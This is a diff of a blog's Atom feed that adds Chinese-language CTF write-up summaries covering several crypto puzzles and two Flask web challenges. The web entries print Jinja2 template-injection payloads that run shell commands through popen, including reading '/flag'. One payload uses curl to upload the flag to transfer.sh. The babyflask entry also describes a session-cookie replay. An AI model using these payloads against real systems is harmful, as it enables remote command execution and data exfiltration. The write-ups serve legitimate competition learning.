@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://zhaoqi.vip/"/>
-  <updated>2021-12-08T09:25:49.813Z</updated>
+  <updated>2021-12-08T09:29:47.692Z</updated>
   <id>https://zhaoqi.vip/</id>
   
   <author>
@@ -21,17 +21,22 @@
     <link href="https://zhaoqi.vip/posts/2827311957/"/>
     <id>https://zhaoqi.vip/posts/2827311957/</id>
     <published>2021-12-08T15:05:34.000Z</published>
-    <updated>2021-12-08T09:25:49.813Z</updated>
+    <updated>2021-12-08T09:29:47.692Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;Open-Flag&quot;&gt;&lt;a href=&quot;#Open-Flag&quot; class=&quot;headerlink&quot; title=&quot;Open Flag&quot;&gt;&lt;/a&gt;Open Flag&lt;/h1&gt;&lt;hr&gt;
+&lt;p&gt;访问题目中给出的链接,发现是一个登录页面&lt;br&gt;&lt;img data-src=&quot;images/login.png&quot; alt=&quot;Open Flag&quot; style=&quot;zoom:80%;&quot;&gt;&lt;br&gt;随便输入一个用户名和密码直接可以登录,提示我们flag文件的路径是&lt;code&gt;./flag.jpg&lt;/code&gt;.&lt;br&gt;F12看源码发现注释中会显示刚才登录所用的用户名,猜测存在SSTI漏洞,直接用注入代码作为用户名登录即可&lt;br&gt;&lt;img data-src=&quot;images/image-20211119203608270.jpg&quot; alt=&quot;image-20211119203608270&quot; style=&quot;zoom:70%;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;使用下列代码作为用户名登录,查看当前已加载的模块;删掉HTML的注释标记&lt;code&gt;&amp;lt;!--&lt;/code&gt;,找到&lt;code&gt;os._wrap_close&lt;/code&gt;模块所在的索引为132,借助于&lt;code&gt;popen&lt;/code&gt;函数可以直接执行系统命令&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&quot;&quot;.__class__.__bases__[0].__subclasses__()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/TamilCTF2021/Web/images/image-20211119212248483.png&quot; alt=&quot;image-20211119212248483&quot;&gt;&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;curl&lt;/code&gt;命令将&lt;code&gt;flag.jpg&lt;/code&gt;文件上传至&lt;a href=&quot;http://transfer.sh/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;transfer.sh&lt;/a&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&quot;&quot;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;curl --upload-file ./flag.jpg http://transfer.sh/flag.jpg&#39;).read()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;在HTML注释中找到文件上传后的URL&lt;code&gt;http://transfer.sh/bDGBlw/flag.jpg&lt;/code&gt;&lt;br&gt;&lt;img data-src=&quot;../../CTF/TamilCTF2021/Web/images/image-20211119204635015.png&quot; alt=&quot;image-20211119204635015&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&quot;images/flag.jpg&quot; alt=&quot;Open Flag&quot; style=&quot;zoom:80%;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;TamilCTF{SsTi_Is_VeRy_DaNgErOuS}&lt;/code&gt;&lt;br&gt;
     
     </summary>
     
@@ -49,17 +54,16 @@
     <link href="https://zhaoqi.vip/posts/501486646/"/>
     <id>https://zhaoqi.vip/posts/501486646/</id>
     <published>2021-12-08T15:05:33.000Z</published>
-    <updated>2021-12-08T09:25:49.813Z</updated>
+    <updated>2021-12-08T09:29:47.620Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;SEA-LANGUAGE-1&quot;&gt;&lt;a href=&quot;#SEA-LANGUAGE-1&quot; class=&quot;headerlink&quot; title=&quot;SEA LANGUAGE 1&quot;&gt;&lt;/a&gt;SEA LANGUAGE 1&lt;/h1&gt;&lt;p&gt;&lt;em&gt;Quick! Help! We are sinking!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Wrap the result in TFCCTF{}&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;看着像摩斯码,直接在&lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Morse_Code(&amp;#39;Space&amp;#39;,&amp;#39;Line%20feed&amp;#39;&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;gchq.github.io&lt;/a&gt;&amp;amp;input=Li0tIC4uLi4gLi4uLi0gLSAtLi4uLi0gLi0gLi0uIC4uLi0tIC0uLi4uLSAtLi0tIC0tLS0tIC4uLSAtLi4uLi0gLi4uIC4tLS0tIC0uIC0uLSAuLS0tLSAtLiAtLS4gLS4uLi4tIC4tIC0uLi4gLS0tLS0gLi4tIC0gLi4tLS4uIC0uLS4tLSAtLi0uLS0gLS4tLi0tIC4uLS0uLgo)上解密&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/TFCCTF2021/Crypto/images/image-20211202204916391.png&quot; alt=&quot;image-20211202204916391&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;TFCCTF{WH4T-AR3-Y0U-S1NK1NG-AB0UT?!!!?}&lt;/code&gt;&lt;br&gt;
     
     </summary>
     
@@ -77,17 +81,51 @@
     <link href="https://zhaoqi.vip/posts/98571386/"/>
     <id>https://zhaoqi.vip/posts/98571386/</id>
     <published>2021-12-08T15:05:32.000Z</published>
-    <updated>2021-12-08T09:25:49.813Z</updated>
+    <updated>2021-12-08T09:29:47.424Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;babyflask&quot;&gt;&lt;a href=&quot;#babyflask&quot; class=&quot;headerlink&quot; title=&quot;babyflask&quot;&gt;&lt;/a&gt;babyflask&lt;/h1&gt;&lt;p&gt;&lt;em&gt;&lt;a href=&quot;http://123.60.19.253:10001&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://123.60.19.253:10001&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;分析给出的源文件,发现&lt;code&gt;/success&lt;/code&gt;路由下的&lt;code&gt;name&lt;/code&gt;存在SSTI漏洞.&lt;/p&gt;
+&lt;p&gt;继续分析,&lt;code&gt;name&lt;/code&gt;取自&lt;code&gt;session[&amp;#39;name&amp;#39;]&lt;/code&gt;,用户登录时会自动创新用户和删除前一个同名用户的登录信息,那其实我们用注入的代码的作为用户名直接登录即可.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;template =  &lt;span class=&quot;string&quot;&gt;&#39;&#39;&#39;&lt;/span&gt;
+&lt;span class=&quot;string&quot;&gt;Congratulations, %s. You can get flag now!&lt;/span&gt;
+&lt;span class=&quot;string&quot;&gt;&#39;&#39;&#39;&lt;/span&gt; % name
+&lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; render_template_string(template)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;要想执行到上述代码,需要给flag投满8票(我们手里只有5票),注意到vote是存储在session中,&lt;code&gt;/vote&lt;/code&gt;接口会校验&lt;code&gt;session&lt;/code&gt;中保存的vote数量并减一,猜测这里可能存在session会话劫持.&lt;/p&gt;
+&lt;p&gt;我们第一次登录时复制一下当前的&lt;code&gt;session&lt;/code&gt;,然后给flag投票,等手里的票用光之后,再把第一次登录时复制的&lt;code&gt;seesion&lt;/code&gt;粘贴进浏览器保存的Cookie中,我们的票又回来了.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;🤠登录后疯狂点击“投票”,也能投满8票;可能因为Server响应太慢,浏览器中保存的session还没来得及被更新,导致多个请求发起时共用一个session(即vote数量相等),session中保存的vote最终只会减一.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;&lt;img data-src=&quot;images/0.jpg&quot; alt=&quot;image-20211114190032492&quot; style=&quot;zoom:50%;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;使用如下代码作为用户名登录,查看一下当前已加载模块&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&quot;images/1.jpg&quot; alt=&quot;image-20211114182131940&quot; style=&quot;zoom:50%;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;人肉计数/写个脚本,找到&lt;code&gt;os._wrap_close&lt;/code&gt;模块所在的索引,借助于&lt;code&gt;popen&lt;/code&gt;函数可以直接执行系统命令&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;num = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;
+&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; a.split(&lt;span class=&quot;string&quot;&gt;&#39;, &#39;&lt;/span&gt;):
+    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;&#39;os._wrap_close&#39;&lt;/span&gt; &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; i:
+        print(num)
+    num += &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;先&lt;code&gt;ls -a&lt;/code&gt;一下,发现&lt;code&gt;config.py&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls -a&#39;).read()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/L3HCTF2021-个人能力认证/Web/images/2.png&quot; alt=&quot;image-20211114183143814&quot;&gt;&lt;br&gt;继续&lt;code&gt;cat&lt;/code&gt;,没有在&lt;code&gt;config.py&lt;/code&gt;中找到flag&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat config.py&#39;).read()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/L3HCTF2021-个人能力认证/Web/images/3.png&quot; alt=&quot;image-20211114183703433&quot;&gt;&lt;/p&gt;
+&lt;p&gt;用&lt;code&gt;ls -R /&lt;/code&gt;找找,发现存在&lt;code&gt;/flag&lt;/code&gt;文件&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;ls -R /&#39;).read()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/L3HCTF2021-个人能力认证/Web/images/4.jpg&quot; alt=&quot;image-20211114183857713&quot;&gt;&lt;br&gt;直接&lt;code&gt;cat /flag&lt;/code&gt;即可&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;{{&#39;&#39;.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;cat /flag&#39;).read()}}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/L3HCTF2021-个人能力认证/Web/images/5.png&quot; alt=&quot;image-20211114184236370&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;l3hsec{emmMmMM_mm~mMMmm~~T}&lt;/code&gt;&lt;/p&gt;
     
     </summary>
     
@@ -107,17 +145,55 @@
     <link href="https://zhaoqi.vip/posts/2621990551/"/>
     <id>https://zhaoqi.vip/posts/2621990551/</id>
     <published>2021-12-08T15:04:27.000Z</published>
-    <updated>2021-12-08T09:25:49.809Z</updated>
+    <updated>2021-12-08T09:29:47.412Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;Cloudsourcing&quot;&gt;&lt;a href=&quot;#Cloudsourcing&quot; class=&quot;headerlink&quot; title=&quot;Cloudsourcing&quot;&gt;&lt;/a&gt;Cloudsourcing&lt;/h1&gt;&lt;p&gt;&lt;em&gt;Sourced in the cloud&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;使用&lt;a href=&quot;https://github.com/Ganapati/RsaCtfTool&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;RsaCtfTool&lt;/a&gt;破解公钥,将得到的私钥保存至&lt;code&gt;a.pem&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;~$ python RsaCtfTool.py --publickey cloudsourcing/key.pub --private
+-----BEGIN RSA PRIVATE KEY-----
+MIIEowIBAAKCAQEAzTf73VQrgsjh5aRpcE1waspEO5B48ZgjIfZyloCzR5cC2Rc1
+e+YwvI/2hNPuageLgmjOqk6FLO3dxa2kemzH2EBG+n7RHlxIe4z6hobXCkXM4Sd4
+O7NvHlkebe5ULoOvpJxs5f7LB4zNffl49MLVRmGJOWI33LVPi86VQg53U5nVCUTn
+dmqWJsnjf06aeNJb0htFA1oy7eA9GaaNyBZC7recU+pj5CJmnlitxaSaLLTahi7m
+lW92j4LDnDnIODhEtxqmWA3sMLoMGGwlve1+cXd4+r1ovhkBWmkBR5/lp/p2KQLs
+pet5HzDZgAlvQzA0Cw2q6B2mt33hgVb7JfT8WQIDAQABAoIBADrihoWyoi2L4K3Z
+KFwODGTIFx4UTW/dXK9hHO4sjcTMAwgxzan4miFxGaZxfWa1NYW89xgNIc+LjWgs
+dBag4hMeFn/IJc8VYcL55+T0Cf4rmyc8ARb4XLkTj1Sx3zvdk2ejbufr3WwULd6o
+19k7kqD4Wby6fxb4e5O9OjzTE9BLvr1NpHN1QRUupSUX3kv/mhtO3gQrRrkAT1L2
+Ais+piqHmSrtX6YAnjood9oW2qy6oyBWvA11ipY9ZqfpI2G5Qc9WtViH/Erz2/3S
+wFf0J9pgn+iAPbhcGwVh6U/cF+BcQZGse9GaY5Us4SJaQmM0ZdKiYbhKTRGBkudH
+60sqeDUCgYEA0mwnrjcDpoc5Kv7qMB4AQCwP6LKnaG5q8Tc86JzYaPEnfUzl4trO
+TruiSXmsok8RM/OLdAiIYiazz3GWgxFVNGtv+cEk4AKQnu2iRg5kP4wKBzqhYCnT
+gMMMnt2UQfUrPOX7WDHaqQaOxkF06GJeHY7/RMswdOlXWx3w4oo2LJMCgYEA+atH
+z0eS+0wzV4lubfpNl/6gi6KJxnpoPJtDt2vJBAa24fbS6ox9bx+Riki/CkpWiGDs
+mb2ha1j5580kzDLfJjt1rncCd1iJy+S8zXmX0I1lkmhCnGKjsDDP4nqGmWoHyc9U
+HxBYPWd2RtKNcBVDLImxr9IGe74GArU0Q2TmcuMCgYAvtwDEe4sjXvRysH1QTe1G
+n/c3kBNwFeHAMwNnx/E20sBepGpYp78ykU+6k5G2+HDxM9/CfxDWGOqbNqmnrO2C
+Rn6MxuRiu5Ipx78NXcQTuOCpRP1E/hcM0q3w9FPjJQIZ/BijpiJsQ6VqhXtKGsw2
+ra9q3Rxu1l7NtZti825XawKBgHMG2LTE8xDYUKc56Ci/M1SduXXb0sIgzzltB0vQ
+WvKB7Ww5/X6Wb4vs7W7aiTnCeg+nKBrE5UPB4JFNUHDL10eUCWnx5q75mbLYlavN
+I4awPmWvp1DJmUSpmH1tmenAkgoGfWk6bI0Nx85lX0iOYz53yeeJSfdk2vwQZB3Q
+tOOlAoGBAM83orP3tq+o57yvX/v36APtNW7ja7fMnSnmZRuWyJDqCJMNvGRlGObt
+hfLludqNeJ4BSJ1nZNqbIvukk8J7DDukrGE5WxP+L1UmuIcTLgOeW7heMEUFbuVG
+SpUX47+QBmx6Q8mHa97x/sGidZMlOEBG38bhvfdMgX0pW8zO+Oll
+-----END RSA PRIVATE KEY-----
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;编写代码,用RSA解密&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.PublicKey &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; RSA
+&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; PKCS1_v1_5 &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; PKCS1_cipher
+&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; base64
+c = &lt;span class=&quot;string&quot;&gt;&#39;Oz5cG3uh6HGoPTsM9yERR2senJ+flkD9dikgzIDimT7xvguYEHGCMvYiD5F5dwbDIlvM7SqYxbzsx5L7+Kfg5OkvrJOMdc7tEsQK7L4n4QSN2mhxVP0AjxpHgufob+MfvL7/36grb6taeW8l5uLUveZ3aPK/XJt35znPScCxTLShFGj0xc/aCxRZYV+oNT6ygyPV4RSGh8v/yeY9bY1wIjYfQLqufKeogcsdBtBXTYQGCX+JQo9NVBLNkU7zQLT+AKit68HkTsORXhjNBFqvj4hQs3jB4rfUt54MKoDDuK0BFrfACKJIQe2LpmBtrVznlyfygIBfmFwrdkHRDi9bdA==&#39;&lt;/span&gt;
+
+&lt;span class=&quot;keyword&quot;&gt;with&lt;/span&gt; open(&lt;span class=&quot;string&quot;&gt;&#39;a.pem&#39;&lt;/span&gt;,&lt;span class=&quot;string&quot;&gt;&#39;r&#39;&lt;/span&gt;) &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; f:
+    pri_key = RSA.importKey(f.read())
+    cipher = PKCS1_cipher.new(pri_key)
+    plain = cipher.decrypt(base64.b64decode(c), &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)
+    print(plain)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;kqctf{y0uv3_6r4du473d_fr0m_r54_m1ddl3_5ch00l_abe7e79e244a9686efc0}&lt;/code&gt;&lt;br&gt;
     
     </summary>
     
@@ -135,17 +211,35 @@
     <link href="https://zhaoqi.vip/posts/3427623925/"/>
     <id>https://zhaoqi.vip/posts/3427623925/</id>
     <published>2021-12-08T13:33:23.000Z</published>
-    <updated>2021-12-08T09:25:49.809Z</updated>
+    <updated>2021-12-08T09:29:47.324Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;3in1&quot;&gt;&lt;a href=&quot;#3in1&quot; class=&quot;headerlink&quot; title=&quot;3in1&quot;&gt;&lt;/a&gt;3in1&lt;/h1&gt;&lt;p&gt;&lt;em&gt;Description&lt;/em&gt;&lt;br&gt;&lt;em&gt;Like Nescafeeeee!&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Attachments&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;&lt;a href=&quot;https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://ctf.k3rn3l4rmy.com/kernelctf-distribution-challs/nescafeee/AES.py&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;分析代码,发现是AES加密,密钥为&lt;code&gt;hkey&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;password = (&lt;span class=&quot;string&quot;&gt;&quot;abda&quot;&lt;/span&gt;)    
+hash_obj = SHA256.new(password.encode(&lt;span class=&quot;string&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;))    
+hkey = hash_obj.digest()
+
+&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;(info)&lt;/span&gt;:&lt;/span&gt;
+    cipher = AES.new(hkey, AES.MODE_ECB)
+    result = cipher.decrypt(info)
+    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; result
+msg =  &lt;span class=&quot;string&quot;&gt;b&#39;\x1bkw\x00\x01#\x1dv\xd1\x1e\xfb\xba\xac_b\x02T\xfbZ\xca\xac8Y\\8@4\xba;\xe1\x11$\x19\xe8\x89t\t\xc8\xfd\x93\xd8-\xba\xaa\xbe\xf1\xa0\xab\x18\xa0\x12$\x9f\xdb\x08~\x81O\xf0y\xe9\xef\xc41\x1a$\x1cN3\xe8F\\\xef\xc1G\xeb\xdb\xa1\x93*F\x1b|\x1c\xec\xa3\x04\xbf\x8a\xd9\x16\xbc;\xd2\xaav6pWX\xc1\xc0o\xab\xd5V^\x1d\x11\xe4}6\xa4\x1b\\G\xd4e\xc2mP\xdb\x9b\x9f\xb0Z\xf12&#39;&lt;/span&gt;
+
+print(decrypt(msg))
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;AES解密得到两个url,访问url得到文件&lt;code&gt;hint.txt&lt;/code&gt;和&lt;code&gt;flag.wav&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&lt;span class=&quot;string&quot;&gt;b&#39;https://www.mediafire.com/file/oii1sm3oyt4tyjc/flag.wav/file\nhttps://www.mediafire.com/file/rgdww91os3we7eo/hint.txt/file&#39;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;查看&lt;code&gt;hint.txt&lt;/code&gt;,提示我们“图形或照片表示”&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;A graphic or photographic representation 
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;使用&lt;a href=&quot;https://www.sonicvisualiser.org/download.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Sonic Visualiser&lt;/a&gt;打开&lt;code&gt;flag.wav&lt;/code&gt;,点击&lt;code&gt;Layer&lt;/code&gt;-&amp;gt;&lt;code&gt;Add Spectrogram&lt;/code&gt;,得到flag&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/K3RN3LCTF2021/Crypto/images/image-20211119215941779.png&quot; alt=&quot;image-20211119215941779&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;flag{34sY_CH4LL3nGe_w1tH_3Xtr4_St3Ps}&lt;/code&gt;&lt;/p&gt;
     
     </summary>
     
@@ -163,17 +257,38 @@
     <link href="https://zhaoqi.vip/posts/4120451577/"/>
     <id>https://zhaoqi.vip/posts/4120451577/</id>
     <published>2021-10-28T02:22:30.000Z</published>
-    <updated>2021-12-08T09:25:49.809Z</updated>
+    <updated>2021-12-08T09:29:47.088Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;Key-Exchange&quot;&gt;&lt;a href=&quot;#Key-Exchange&quot; class=&quot;headerlink&quot; title=&quot;Key Exchange&quot;&gt;&lt;/a&gt;Key Exchange&lt;/h1&gt;&lt;p&gt;&lt;em&gt;Let’s exchange the flag (securely):&lt;/em&gt;&lt;br&gt;&lt;em&gt;nc crypto.chall.pwnoh.io 13374&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;分析给出的代码,发现当输入的B等于g的时候,A的值即为&lt;code&gt;shared_secret&lt;/code&gt;,从而可以得到AES密钥,解密后即可得到flag.&lt;/p&gt;
+&lt;p&gt;使用nc连接服务器:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;shell&quot;&gt;╭─ ~/CTF/BuckeyeCTF2021
+╰─$ nc crypto.chall.pwnoh.io 13374
+I&amp;#39;m going to send you the flag.
+However, I noticed that an FBI agent has been eavesdropping on my messages,
+so I&amp;#39;m going to send it to you in a way that ONLY YOU can decrypt the flag.
+
+p = 10880518517873967643757501014080864657695946662967756945469976115601889926901188881654458659008874387964581741306546485865737476973040012870453076020399351
+g = 5
+A = 6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180
+Give me your public key B: 5
+ciphertext = a54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;代码&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;python&quot;&gt;&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;decrypt&lt;/span&gt;&lt;span class=&quot;params&quot;&gt;()&lt;/span&gt;:&lt;/span&gt;
+    shared_secret = &lt;span class=&quot;number&quot;&gt;6446823763385202977767001480185601116794559100492085785295943164615816598597259338015414246293095497644717507604784350316218874347470456507125850300019180&lt;/span&gt;
+    key = hashlib.sha1(cun.long_to_bytes(shared_secret)).digest()[:&lt;span class=&quot;number&quot;&gt;16&lt;/span&gt;]
+    cipher = AES.new(key, AES.MODE_ECB)
+    message = &lt;span class=&quot;number&quot;&gt;0xa54eef574e0764239040ee22ffe762c907e7390372bf7de1f8ea7db0fa8218490890d545e5694332c8de1154fdff4cfb830a304df635217155b453bd12beb4e8&lt;/span&gt;
+    plaintext = cipher.decrypt(cun.long_to_bytes(message))
+    print(plaintext)
+
+decrypt()
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;buckeye{DH_1s_s0_h3ck1ng_c00l_l1k3_wh0_w0uldv3_th0ught_0f_th1s?}&lt;/code&gt;&lt;/p&gt;
     
     </summary>
     
@@ -191,17 +306,16 @@
     <link href="https://zhaoqi.vip/posts/2879210530/"/>
     <id>https://zhaoqi.vip/posts/2879210530/</id>
     <published>2021-10-28T02:21:49.000Z</published>
-    <updated>2021-12-08T09:25:49.809Z</updated>
+    <updated>2021-12-08T09:29:47.236Z</updated>
     
     <summary type="html">
     
-      
-      
-        
-        
-          &lt;link rel=&quot;stylesheet&quot; href=&quot;/css/spoiler.css&quot; type=&quot;text/css&quot;&gt;&lt;script src=&quot;/js/spoiler.js&quot; type=&quot;text/javascript&quot;
-        
-      
+      &lt;h1 id=&quot;Poor-MEAGAN&quot;&gt;&lt;a href=&quot;#Poor-MEAGAN&quot; class=&quot;headerlink&quot; title=&quot;Poor MEAGAN!&quot;&gt;&lt;/a&gt;Poor MEAGAN!&lt;/h1&gt;&lt;p&gt;&lt;em&gt;Oh, NO! Poor Megan! She’s just been bitten by a ZOMBIE! We can save her if we act fast, but the formula for the antidote has been scrambled somehow. Figure out how to unscramble &amp;gt;the formula to save Megan from certain zombification. Enter the answer as flag{here-is-the-answer}.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;The formula for the antidote: j2rXjx9dkhW9eLKsnMR9cLDVjh/9dwz1QfGXm+b9=wKslL1Zpb45&lt;/em&gt;&lt;/p&gt;
+&lt;hr&gt;
+&lt;p&gt;看起来像一个base64字符串,但是似乎被混淆了,使用&lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64(&amp;#39;3GHIJKLMNOPQRSTUb%3DcdefghijklmnopWXYZ/12%2B406789VaqrstuvwxyzABCDEF5&amp;#39;,true&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;CyberChef&lt;/a&gt;&amp;amp;input=ajJyWGp4OWRraFc5ZUxLc25NUjljTERWamgvOWR3ejFRZkdYbStiOT13S3NsTDFacGI0NQ)搭配Megan35解码即可&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&quot;../../CTF/DEADFACECTF/Crypto/images/Poor_Meagan.png&quot; alt=&quot;CyberChef&quot;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;flag:&lt;/strong&gt;&lt;code&gt;flag{Six-Parts-Honey-One-Part-Garlic}&lt;/code&gt;&lt;/p&gt;
     
     </summary>
     
@@ -219,7 +333,7 @@
     <link href="https://zhaoqi.vip/posts/2302350511/"/>
     <id>https://zhaoqi.vip/posts/2302350511/</id>
